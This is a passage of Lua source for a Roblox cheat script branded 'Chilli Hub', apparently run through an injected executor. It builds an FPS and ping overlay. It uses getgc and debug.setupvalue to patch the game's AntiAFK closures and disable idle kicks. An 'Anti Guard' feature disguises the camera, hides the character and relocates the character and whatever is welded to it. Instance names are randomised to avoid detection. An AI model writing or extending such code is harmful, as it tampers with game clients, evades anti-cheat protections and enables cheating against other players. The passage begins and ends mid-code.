		local currentCamera = workspace.CurrentCamera
		local viewportSize = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if viewportSize.X < 1 then
			viewportSize = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(viewportSize.X * n14 / n13, 0.7, 1.4) * n17
	end

	local function fn21()
		for _, v20 in ipairs(tbl17) do
			pcall(function()
				v20:Disconnect()
			end)
		end

		table.clear(tbl17)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		frame = nil
		uiScale = nil
		v16 = nil
		v17 = nil
		v18 = nil
		v19 = nil
		n18 = 0
	end

	local function createTextLabel(parent, arg, arg2, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = fn3()
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(arg, 9)
		textLabel.Size = UDim2.fromOffset(arg2, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		if font then
			textLabel.FontFace = font
		else
			textLabel.Font = Enum.Font.GothamBold
		end

		textLabel.Parent = parent
		return textLabel
	end

	local function fn22()
		fn21()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.Active = true
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = fn16()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0, 12)
		uiCorner.Parent = frame
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = fn3()
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn20()
		v16 = createTextLabel(frame, 12, 34, color3)
		createTextLabel(frame, 48, 22, color6).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.Name = fn3()
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		v17 = createTextLabel(frame, 82, 30, color3)
		createTextLabel(frame, 113, 14, color6).Text = "ms"
		screenGui.Parent = v3
		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl17[#tbl17 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn20)
		end

		local flag4 = false
		local v20 = nil
		local vector2 = Vector2.zero
		local position = nil

		tbl17[#tbl17 + 1] = frame.InputBegan:Connect(function(input)
			if flag4 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			local flag5 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag5 then
				return
			end
			flag4 = true
			v20 = flag5 and input or nil
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
		end)

		tbl17[#tbl17 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag4 or not frame or not position then
				return
			end

			if not (v20 and input == v20 or not v20 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return
			end
			local n20 = Vector2.new(input.Position.X, input.Position.Y) - vector2
			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n20.X, position.Y.Scale, position.Y.Offset + n20.Y)
		end)

		tbl17[#tbl17 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag4 then
				return
			end

			if v20 and input == v20 or not v20 and input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag4 = false
				v20 = nil
				position = nil

				if frame then
					fn17(frame.Position)
				end
			end
		end)

		tbl17[#tbl17 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag3 or not v16 then
				return
			end
			local n20 = math.clamp(deltaTime, 0.001, 1)
			local n21 = 1 / n20

			if n18 <= 0 then
				n18 = n21
			else
				n18 += (n21 - n18) * (1 - math.exp(-n20 * n16))
			end

			local now = os.clock()
			if now < n19 then
				return
			end
			n19 = now + n15
			local n22 = math.floor(n18 + 0.5)
			local text = tostring(n22)

			if text ~= v18 then
				v18 = text
				v16.Text = text
				v16.TextColor3 = fn18(n22)
			end

			local n23 = 0

			pcall(function()
				n23 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local n24 = math.floor(n23 + 0.5)
			local text2 = tostring(n24)

			if text2 ~= v19 then
				v19 = text2
				v17.Text = text2
				v17.TextColor3 = fn19(n24)
			end
		end)
	end

	v14:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		SubOf = v14:CreateToggle({
			Name = "FPS and Ping",
			Default = true,
			Callback = function(arg)
				flag3 = arg == true

				if flag3 then
					fn22()
				else
					fn21()
				end
			end,
		}),
		Callback = function(arg)
			n17 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
			fn20()
		end,
	})

	fn4(fn21)
end

do
	local v15 = v13:CreateSection({ Name = "Utility", Expanded = true })
	local tbl17 = { Enabled = true, Alive = true, Silenced = {} }

	local function fn16()
		if type(getconnections) ~= "function" then
			return {}
		end
		local ok, result = pcall(getconnections, localPlayer.Idled)
		return ok and type(result) == "table" and result or {}
	end

	local function fn17()
		for _, v16 in ipairs(fn16()) do
			if pcall(function()
				v16:Disable()
			end) then
				tbl17.Silenced[#tbl17.Silenced + 1] = v16
			end
		end
	end

	local function fn18()
		local silenced = tbl17.Silenced

		if #silenced == 0 then
			silenced = fn16()
		end

		for _, v16 in ipairs(silenced) do
			pcall(function()
				v16:Enable()
			end)
		end

		table.clear(tbl17.Silenced)
	end

	local obj = setmetatable({}, { __index = function()
		return function()
		end
	end })

	local tbl18 = {}

	local function fn19()
		local tbl19 = {}
		if type(getgc) ~= "function" or type(debug) ~= "table" or type(debug.getupvalues) ~= "function" then
			return tbl19
		end
		local ok, result = pcall(getgc, false)
		if not ok or type(result) ~= "table" then
			return tbl19
		end

		for _, v16 in ipairs(result) do
			if type(v16) == "function" and islclosure(v16) then
				local ok2, result2 = pcall(debug.info, v16, "s")

				if ok2 and type(result2) == "string" and string.find(result2, "AntiAFK", 1, true) then
					local ok3, result3 = pcall(debug.getupvalues, v16)

					if ok3 and type(result3) == "table" then
						for k, v17 in pairs(result3) do
							if typeof(v17) == "Instance" and v17.ClassName == "TeleportService" then
								tbl19[#tbl19 + 1] = { Fn = v16, Index = k, Original = v17 }
							end
						end
					end
				end
			end
		end

		return tbl19
	end

	local function fn20()
		for _, v16 in ipairs(fn19()) do
			local ok, result = pcall(debug.getupvalue, v16.Fn, v16.Index)

			if ok and typeof(result) == "Instance" then
				if pcall(debug.setupvalue, v16.Fn, v16.Index, obj) then
					tbl18[#tbl18 + 1] = v16
				end
			end
		end
	end

	local function fn21()
		for _, v16 in ipairs(tbl18) do
			pcall(debug.setupvalue, v16.Fn, v16.Index, v16.Original)
		end

		table.clear(tbl18)
	end

	local function fn22()
		fn17()

		if #tbl18 == 0 then
			fn20()
		end
	end

	local connection = localPlayer.CharacterAdded:Connect(function()
		task.delay(1, function()
			if tbl17.Alive and tbl17.Enabled then
				table.clear(tbl17.Silenced)
				pcall(fn22)
			end
		end)
	end)

	fn4(function()
		pcall(function()
			connection:Disconnect()
		end)
	end)

	fn4(function()
		tbl17.Alive = false
		fn18()
		fn21()
	end)

	task.spawn(function()
		while tbl17.Alive do
			if tbl17.Enabled then
				fn22()
			end

			task.wait(600)
		end
	end)

	v15:CreateToggle({
		Name = "Anti AFK",
		Default = true,
		Callback = function(arg)
			tbl17.Enabled = arg ~= false

			if tbl17.Enabled then
				fn22()
			else
				fn18()
				fn21()
			end
		end,
	})
end

local GuiService2, StarterGui, antiGuard, tbl17, chilliAntiGuard, tbl18, tbl19, n13, flag3, tbl20
local tbl21, fn16, hui, fn17, ScreenGui, Frame, UIScale, Frame2, UIScale2, UIGradient
local fn18

do
	local TweenService = game:GetService("TweenService")
	GuiService2 = game:GetService("GuiService")
	StarterGui = game:GetService("StarterGui")
	antiGuard = tbl4.AntiGuard

	tbl17 = {
		Target = "line",
		LineOffset = 8,
		Height = 45,
		OffsetX = -90,
		OffsetZ = -35,
		Jitter = 0,
		Point = false,
		Disguise = true,
		Limp = true,
		Facing = "Zero",
		Freeze = false,
		StartAt = 0,
		Steps = {
			{ At = 0.1, To = "home" },
			{ At = 0.33, To = "home" },
			{ At = 0.56, To = "home" },
			{ At = 0.75, To = "start" },
		},
		ReleaseAt = 0.8,
		WeldScanGap = 0.03,
		BusyLimit = 2.5,
	}

	local function fn19(arg, arg2, arg3, arg4, arg5, arg6)
		local tbl22 = {}

		for i = 1, arg do
			tbl22[#tbl22 + 1] = { At = arg2 + arg3 * (i - 1), To = "home" }
		end

		tbl22[#tbl22 + 1] = { At = arg4, To = "start" }

		return {
			Target = "home",
			LineOffset = 8,
			Height = 0,
			OffsetX = 0,
			OffsetZ = 0,
			Jitter = 0,
			Point = false,
			Disguise = true,
			Limp = false,
			Facing = "Zero",
			Freeze = true,
			StartAt = 0,
			StartRandom = 0,
			HopRandom = 0.085,
			HoldRandom = 0.395,
			Steps = tbl22,
			ReleaseAt = arg5,
			WeldScanGap = 0.03,
			BusyLimit = arg6,
		}
	end

	chilliAntiGuard = { LightDark = tbl17, Default = fn19(25, 0, 0.05, 1.27, 1.52, 2.5) }

	pcall(function()
		getgenv().ChilliAntiGuard = chilliAntiGuard
	end)

	tbl18 = {
		Card = Color3.fromRGB(15, 15, 19),
		CardTop = Color3.fromRGB(24, 22, 28),
		Stroke = Color3.fromRGB(48, 46, 56),
		Text = Color3.fromRGB(240, 238, 244),
		AccentA = Color3.fromRGB(255, 72, 72),
		AccentB = Color3.fromRGB(255, 150, 60),
		Good = Color3.fromRGB(80, 220, 140),
		Work = Color3.fromRGB(255, 190, 70),
		Bad = Color3.fromRGB(240, 90, 90),
		Off = Color3.fromRGB(58, 56, 66),
	}

	tbl19 = {
		{ Path = { "GearGiver_Slap", "Podium" }, Offset = Vector3.new(-16.415, 21.072, -6.106) },
		{
			Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
		{
			Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
			Offset = Vector3.new(-26.776, 1.75, 18.665),
		},
	}

	n13 = 52
	flag3 = true
	tbl20 = {}

	tbl21 = {
		AreaId = nil,
		SignalCarrying = false,
		WeldCarrying = false,
		Carrying = false,
		Active = false,
		Disguise = nil,
		FlashRequest = nil,
		FlashUntil = 0,
	}

	fn16 = function()
		local tbl22 = {}

		for i = 1, math.random(10, 16) do
			tbl22[i] = string.char(math.random(97, 122))
		end

		return table.concat(tbl22)
	end

	hui = nil

	pcall(function()
		hui = gethui()
	end)

	hui = hui or CoreGui

	local function fn20(arg, parent, arg2)
		local instance = Instance.new(arg)
		instance.Name = fn16()
		local v15 = pairs
		local tbl22 = arg2 or {}

		for k, v16 in v15(tbl22) do
			instance[k] = v16
		end

		instance.Parent = parent
		return instance
	end

	fn17 = function(arg, arg2, arg3, arg4)
		local ok, result = pcall(function()
			local v15 = TweenService
			local create = v15.Create
			local tweenInfo = TweenInfo.new
			local v16 = arg4
			local quint

			if arg4 then
				quint = v16
			else
				quint = Enum.EasingStyle.Quint
			end

			return create(v15, arg, tweenInfo(arg2, quint, Enum.EasingDirection.Out), arg3)
		end)

		if ok and result then
			result:Play()
		end
	end

	ScreenGui = fn20("ScreenGui", nil, {
		ResetOnSpawn = false,
		IgnoreGuiInset = true,
		DisplayOrder = -100,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	})

	Frame = fn20("Frame", ScreenGui, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 1, -120),
		Size = UDim2.fromOffset(226, 52),
		BackgroundTransparency = 1,
	})

	UIScale = fn20("UIScale", Frame, { Scale = 1 })

	Frame2 = fn20("Frame", Frame, {
		Size = UDim2.fromScale(1, 1),
		BackgroundColor3 = tbl18.Card,
		BorderSizePixel = 0,
		Active = true,
	})

	fn20("UICorner", Frame2, { CornerRadius = UDim.new(0, 14) })
	UIScale2 = fn20("UIScale", Frame2, { Scale = 0.86 })
	fn20("UIGradient", Frame2, { Color = ColorSequence.new(tbl18.CardTop, tbl18.Card), Rotation = 90 })

	local UIStroke = fn20("UIStroke", Frame2, {
		Thickness = 1.5,
		Color = Color3.fromRGB(255, 255, 255),
		Transparency = 0.2,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})

	UIGradient = fn20("UIGradient", UIStroke, { Color = ColorSequence.new(tbl18.Stroke, tbl18.Stroke) })

	local Frame3 = fn20("Frame", Frame2, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 10, 0.5, 0),
		Size = UDim2.fromOffset(36, 36),
		BackgroundColor3 = Color3.fromRGB(28, 26, 32),
		BorderSizePixel = 0,
		ZIndex = 2,
	})

	fn20("UICorner", Frame3, { CornerRadius = UDim.new(0, 11) })
	local UIStroke2 = fn20("UIStroke", Frame3, { Thickness = 1.5, Color = tbl18.Off, ApplyStrokeMode = Enum.ApplyStrokeMode.Border })

	local ImageLabel = fn20("ImageLabel", Frame3, {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.fromScale(0.5, 0.5),
		Size = UDim2.fromScale(0.86, 0.86),
		BackgroundTransparency = 1,
		Image = "rbxassetid://128961717706452",
		ImageTransparency = 0.35,
		ScaleType = Enum.ScaleType.Crop,
		ZIndex = 3,
	})

	fn20("UICorner", ImageLabel, { CornerRadius = UDim.new(0, 8) })
	local UIScale3 = fn20("UIScale", ImageLabel, { Scale = 1 })
	local color3 = Color3.fromRGB

	fn20("UIGradient", fn20("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 7),
		Size = UDim2.new(1, -112, 0, 15),
		Font = Enum.Font.BuilderSansExtraBold,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Text = "Chilli Hub",
		ZIndex = 2,
	}), { Color = ColorSequence.new(Color3.fromRGB(255, 120, 100), color3(255, 190, 110)) })

	fn20("TextLabel", Frame2, {
		BackgroundTransparency = 1,
		Position = UDim2.new(0, 56, 0, 22),
		Size = UDim2.new(1, -112, 0, 20),
		Font = Enum.Font.GothamBlack,
		TextSize = 15,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = tbl18.Text,
		Text = "Anti Guard",
		ZIndex = 2,
	})

	local TextButton = fn20("TextButton", Frame2, {
		AnchorPoint = Vector2.new(1, 0.5),
		Position = UDim2.new(1, -12, 0.5, 0),
		Size = UDim2.fromOffset(42, 22),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AutoButtonColor = false,
		BorderSizePixel = 0,
		Text = "",
		ZIndex = 2,
	})

	fn20("UICorner", TextButton, { CornerRadius = UDim.new(1, 0) })
	local UIGradient2 = fn20("UIGradient", TextButton, { Color = ColorSequence.new(tbl18.Off, tbl18.Off) })

	local Frame4 = fn20("Frame", TextButton, {
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 3, 0.5, 0),
		Size = UDim2.fromOffset(16, 16),
		BackgroundColor3 = Color3.fromRGB(245, 245, 250),
		BorderSizePixel = 0,
		ZIndex = 3,
	})

	fn20("UICorner", Frame4, { CornerRadius = UDim.new(1, 0) })

	local function fn21()
		return antiGuard.Enabled and tbl18.AccentA or tbl18.Off
	end

	local function render(arg)
		local n14 = arg and 0 or 0.28

		if antiGuard.Enabled then
			UIGradient2.Color = ColorSequence.new(tbl18.AccentA, tbl18.AccentB)
			local v15 = UIGradient
			local colorSequence = ColorSequence.new
			local tbl22 = {}
			local v16 = ColorSequenceKeypoint.new(0, tbl18.Stroke)
			local v17 = ColorSequenceKeypoint.new(0.45, tbl18.AccentA)
			local v18 = ColorSequenceKeypoint.new(0.55, tbl18.AccentB)
			local new = ColorSequenceKeypoint.new
			local stroke = tbl18.Stroke
			tbl22[1] = v16
			tbl22[2] = v17
			tbl22[3] = v18

			do
				local values = table.pack(new(1, stroke))
				table.move(values, 1, values.n, 4, tbl22)
			end

			v15.Color = colorSequence(tbl22)
			fn17(Frame4, n14, { Position = UDim2.new(1, -19, 0.5, 0) }, Enum.EasingStyle.Back)
			fn17(ImageLabel, n14, { ImageTransparency = 0 })
			fn17(UIStroke, 0.3, { Transparency = 0 })
		else
			UIGradient2.Color = ColorSequence.new(tbl18.Off, tbl18.Off)
			UIGradient.Color = ColorSequence.new(tbl18.Stroke, tbl18.Stroke)
			fn17(Frame4, n14, { Position = UDim2.new(0, 3, 0.5, 0) }, Enum.EasingStyle.Back)
			fn17(ImageLabel, n14, { ImageTransparency = 0.35 })
			fn17(UIStroke, 0.3, { Transparency = 0.2 })
		end

		if tbl21.FlashUntil <= os.clock() then
			fn17(UIStroke2, n14, { Color = fn21() })
		end
	end

	fn18 = function(arg, arg2)
		tbl21.FlashRequest = { Color = arg, Hold = arg2 }
	end

	local function fn22()
		local flashRequest = tbl21.FlashRequest
		if not flashRequest then
			return
		end
		tbl21.FlashRequest = nil
		tbl21.FlashUntil = os.clock() + (flashRequest.Hold or 0)
		fn17(UIStroke2, 0.2, { Color = flashRequest.Color })

		if flashRequest.Hold then
			task.delay(flashRequest.Hold, function()
				local flag4 = flag3

				if flag3 then
					local flashUntil = tbl21.FlashUntil
					flag4 = os.clock() >= flashUntil
				end

				if flag4 then
					fn17(UIStroke2, 0.3, { Color = fn21() })
				end
			end)
		end
	end

	local function fn23(arg)
		local handle = antiGuard.Handle
		if type(handle) ~= "table" then
			return
		end

		for _, v15 in ipairs({ "Set", "SetValue" }) do
			local ok, result = pcall(function()
				return handle[v15]
			end)

			if ok and type(result) == "function" and pcall(result, handle, arg) then
				return
			end
		end
	end

	antiGuard.Render = render

	local TextButton2 = fn20("TextButton", Frame2, {
		Size = UDim2.fromScale(1, 1),
		BackgroundTransparency = 1,
		AutoButtonColor = false,
		Text = "",
		ZIndex = 10,
	})

	tbl20[#tbl20 + 1] = TextButton2.MouseButton1Click:Connect(function()
		antiGuard.Enabled = not antiGuard.Enabled
		render(false)
		fn23(antiGuard.Enabled)
		fn17(UIScale3, 0.12, { Scale = 1.15 })

		task.delay(0.12, function()
			if flag3 then
				fn17(UIScale3, 0.3, { Scale = 1 }, Enum.EasingStyle.Back)
			end
		end)
	end)

	local size = TextButton.Size

	tbl20[#tbl20 + 1] = TextButton2.MouseEnter:Connect(function()
		fn17(TextButton, 0.15, { Size = size + UDim2.fromOffset(2, 2) })
	end)

	tbl20[#tbl20 + 1] = TextButton2.MouseLeave:Connect(function()
		fn17(TextButton, 0.15, { Size = size })
	end)

	local tbl22 = {
		Hotbar = true,
		HotBar = true,
		Toolbar = true,
		ToolBar = true,
		Backpack = true,
		Inventory = true,
	}

	local tbl23 = {}
	local huge = math.huge
	local huge2 = math.huge
	local rotation = 0
	local n14 = nil

	local function fn24(arg)
		while arg do
			if arg:IsA("GuiObject") and not arg.Visible then
				return false
			end

			if arg:IsA("LayerCollector") then
				return arg.Enabled
			end
			arg = arg.Parent
		end

		return false
	end

	local function fn25()
		local ok, result = pcall(function()
			return GuiService2:GetGuiInset().Y
		end)

		return ok and result or 0
	end

	local function fn26(arg)
		local v15 = nil

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("GuiButton") and descendant.Visible and descendant.AbsoluteSize.Y > 8 and descendant.AbsoluteSize.X > 8 then
				local y = descendant.AbsolutePosition.Y

				if not v15 or y < v15 then
					v15 = y
				end
			end
		end

		return v15 or arg.AbsolutePosition.Y
	end

	local function fn27()
		table.clear(tbl23)
		local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
		if not playerGui then
			return
		end

		for _, descendant in ipairs(playerGui:GetDescendants()) do
			if descendant:IsA("GuiObject") and tbl22[descendant.Name] then
				tbl23[#tbl23 + 1] = descendant
			end
		end
	end

	local function fn28()
		local tbl24 = {}

		pcall(function()
			if not StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Backpack) then
				return
			end

			for _, child in ipairs(CoreGui.RobloxGui.Backpack:GetChildren()) do
				if child:IsA("GuiObject") then
					tbl24[#tbl24 + 1] = child
				end
			end
		end)

		for _, v15 in ipairs(tbl23) do
			if v15.Parent then
				tbl24[#tbl24 + 1] = v15
			end
		end

		return tbl24
	end

	local function fn29()
		local currentCamera = workspace.CurrentCamera
		if not currentCamera then
			return
		end
		local viewportSize = currentCamera.ViewportSize
		if viewportSize.X < 10 or viewportSize.Y < 10 then
			return
		end
		local flag4 = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
		local n15 = math.min(viewportSize.X / 1280, viewportSize.Y / 720)
		local scale = flag4 and math.clamp(n15 * 1.05, 0.6, 0.8) * 0.97 or math.clamp(n15, 0.8, 1.1)
		UIScale.Scale = scale
		local backgroundTransparency = flag4 and 0.3 or 0

		if Frame2.BackgroundTransparency ~= backgroundTransparency then
			Frame2.BackgroundTransparency = backgroundTransparency
			Frame3.BackgroundTransparency = backgroundTransparency
		end

		local n16 = viewportSize.Y - 8 * scale
		local flag5 = false

		for _, v15 in ipairs(fn28()) do
			local ok, result = pcall(fn24, v15)

			if ok and result then
				local absoluteSize = v15.AbsoluteSize
				local y = v15.AbsolutePosition.Y

				if absoluteSize.X > 20 and absoluteSize.Y > 20 and absoluteSize.Y < viewportSize.Y * 0.4 and y + absoluteSize.Y / 2 > viewportSize.Y * 0.5 then
					local ok2, result2 = pcall(fn26, v15)
					result2 = ok2 and result2 or y
					flag5 = true
					n16 = math.min(n16, result2 + fn25(v15))
				end
			end
		end

		if flag5 then
			n14 = viewportSize.Y - n16
		elseif n14 then
			n16 = viewportSize.Y - n14
		end

		local n17 = math.max(n16 - (flag4 and 4 or 6) * scale - n13 * scale / 2, n13 * scale / 2 + 8)
		Frame.Position = UDim2.new(0.5, 0, 0, n17)
	end

	tbl20[#tbl20 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
		fn22()
		huge += deltaTime
		huge2 += deltaTime

		if huge >= 3 then
			huge = 0
			pcall(fn27)
		end

		if huge2 >= 0.2 then
			huge2 = 0
			pcall(fn29)
		end

		if antiGuard.Enabled then
			rotation = (rotation + deltaTime * (tbl21.Active and 360 or 90)) % 360
			UIGradient.Rotation = rotation
		end
	end)

	render(true)
end

antiGuard.ShowPanel = function(arg)
	ScreenGui.Enabled = arg == true
end

ScreenGui.Enabled = antiGuard.PanelShown == true
ScreenGui.Parent = hui
fn17(UIScale2, 0.45, { Scale = 1 }, Enum.EasingStyle.Back)

do
	local function fn19()
		local v15 = tbl4.Root()
		if not v15 then
			return nil
		end

		for _, child in ipairs(workspace:GetChildren()) do
			if child:IsA("Model") and child:FindFirstChild("Hitbox") then
				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, result, result2 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok and (result == v15 or result2 == v15) then
							return child
						end
					end
				end
			end
		end

		return nil
	end

	local function fn20(arg, parent)
		local tbl22 = {}

		for _, descendant in ipairs(arg:GetDescendants()) do
			tbl22[descendant] = descendant.Archivable

			pcall(function()
				descendant.Archivable = true
			end)
		end

		local archivable = arg.Archivable
		arg.Archivable = true

		local ok, result = pcall(function()
			return arg:Clone()
		end)

		arg.Archivable = archivable

		for k, v15 in pairs(tbl22) do
			pcall(function()
				k.Archivable = v15
			end)
		end

		if not ok or not result then
			return nil
		end
		result.Name = fn16()

		for _, descendant in ipairs(result:GetDescendants()) do
			if descendant:IsA("LuaSourceContainer") or descendant:IsA("Sound") or descendant:IsA("ForceField") or descendant:IsA("JointInstance") or descendant:IsA("Constraint") or descendant:IsA("WeldConstraint") or descendant:IsA("BodyMover") or descendant:IsA("ProximityPrompt") or descendant:IsA("BillboardGui") then
				pcall(function()
					descendant:Destroy()
				end)
			elseif descendant:IsA("BasePart") then
				descendant.Anchored = true
				descendant.CanCollide = false
				descendant.CanQuery = false
				descendant.CanTouch = false
			elseif descendant:IsA("Humanoid") then
				descendant.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
				descendant.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
			end
		end

		result.Parent = parent
		return result
	end

	local function fn21(arg, arg2)
		local currentCamera = workspace.CurrentCamera
		if not arg or not currentCamera or tbl21.Disguise then
			return
		end
		arg2 = arg2 or Vector3.zero
		local disguise = { Camera = currentCamera, CameraType = currentCamera.CameraType, CameraCFrame = currentCamera.CFrame, Copies = {}, Hidden = {} }
		tbl21.Disguise = disguise
		local tbl22 = { arg }
		local ok, result = pcall(fn19)

		if ok and result then
			tbl22[#tbl22 + 1] = result
		end

		for _, v15 in ipairs(tbl22) do
			for _, descendant in ipairs(v15:GetDescendants()) do
				if descendant:IsA("BasePart") or descendant:IsA("Decal") or descendant:IsA("Texture") then
					disguise.Hidden[#disguise.Hidden + 1] = descendant
				end
			end
		end

		local function fn22()
			for _, v15 in ipairs(disguise.Hidden) do
				pcall(function()
					v15.LocalTransparencyModifier = 1
				end)
			end

			pcall(function()
				if currentCamera.CameraType ~= Enum.CameraType.Scriptable then
					currentCamera.CameraType = Enum.CameraType.Scriptable
				end

				currentCamera.CFrame = disguise.CameraCFrame
			end)
		end

		fn22()
		disguise.BindName = fn16()

		if not pcall(function()
			RunService:BindToRenderStep(disguise.BindName, Enum.RenderPriority.Last.Value + 1, fn22)
		end) then
			disguise.BindName = nil
			disguise.Link = RunService.RenderStepped:Connect(fn22)
		end

		disguise.Beat = RunService.Heartbeat:Connect(fn22)

		for _, v15 in ipairs(tbl22) do
			local ok2, result2 = pcall(fn20, v15, currentCamera)

			if ok2 and result2 then
				if arg2.Magnitude > 0.01 then
					for _, descendant in ipairs(result2:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.CFrame = descendant.CFrame + arg2
							end)
						end
					end
				end

				disguise.Copies[#disguise.Copies + 1] = result2
			end
		end
	end

	local function fn22()
		local disguise = tbl21.Disguise
		if not disguise then
			return
		end
		tbl21.Disguise = nil

		if disguise.BindName then
			pcall(function()
				RunService:UnbindFromRenderStep(disguise.BindName)
			end)
		end

		if disguise.Link then
			pcall(function()
				disguise.Link:Disconnect()
			end)
		end

		if disguise.Beat then
			pcall(function()
				disguise.Beat:Disconnect()
			end)
		end

		for _, v15 in ipairs(disguise.Hidden) do
			pcall(function()
				v15.LocalTransparencyModifier = 0
			end)
		end

		pcall(function()
			disguise.Camera.CameraType = disguise.CameraType
		end)

		for _, copy in ipairs(disguise.Copies) do
			pcall(function()
				copy:Destroy()
			end)
		end
	end

	local function fn23()
		for _, v15 in ipairs(tbl19) do
			local v16 = workspace

			for _, v17 in ipairs(v15.Path) do
				v16 = v16 and v16:FindFirstChild(v17) or nil
			end

			if v16 and v16:IsA("BasePart") then
				return v16.CFrame:PointToWorldSpace(v15.Offset)
			end
		end

		return Vector3.new(528.7, 70.57, -364.11)
	end

	local function fn24(arg, arg2, arg3, arg4, arg5)
		local cFrame = CFrame.new(arg3) * arg4

		pcall(function()
			arg:PivotTo(cFrame)
		end)

		if (arg2.Position - arg3).Magnitude > 3 then
			pcall(function()
				arg2.CFrame = cFrame
			end)
		end

		if arg5 == false then
			return
		end

		for _, descendant in ipairs(arg:GetDescendants()) do
			if descendant:IsA("BasePart") then
				pcall(function()
					descendant.AssemblyLinearVelocity = Vector3.zero
					descendant.AssemblyAngularVelocity = Vector3.zero
				end)
			end
		end
	end

	local function fn25()
		local areaId = tbl21.AreaId

		if type(areaId) ~= "string" or areaId == "" then
			areaId = type(tbl4.Steal) == "table" and tbl4.Steal.CarryAreaId or nil
		end

		if type(areaId) ~= "string" or areaId == "" then
			areaId = localPlayer:GetAttribute("AreaId")
			areaId = type(areaId) == "string" and areaId or nil
		end

		return areaId
	end

	local tbl22 = { lightdark = "LightDark" }

	local function fn26(arg)
		if type(arg) ~= "string" then
			return "Default"
		end
		local lower = string.lower
		local v15 = string.gsub(arg, "[^%a]", "")
		return tbl22[lower(v15)] or "Default"
	end

	local function fn27()
		local ok, result = pcall(function()
			return getgenv().ChilliAntiGuard
		end)

		if ok and type(result) == "table" then
			if type(result.Steps) == "table" then
				return result
			end
			local default = result[fn26(fn25())] or result.Default
			if type(default) == "table" then
				return default
			end
		end

		return chilliAntiGuard[fn26(fn25())] or tbl17
	end

	local function fn28()
		local v15 = fn27()
		local options = antiGuard.Options
		if type(options) ~= "table" or options.Destination == "Safe Zone" and not options.Stay then
			return v15
		end
		local tbl23 = {}

		for k, v16 in pairs(v15) do
			tbl23[k] = v16
		end

		if options.Destination == "Next To Line" then
			tbl23.Target = "edge"
			tbl23.LineOffset = 6
			tbl23.Height = 0
			tbl23.OffsetX = 0
			tbl23.OffsetZ = 0
		elseif options.Destination == "Saved Spot" and typeof(options.Spot) == "Vector3" then
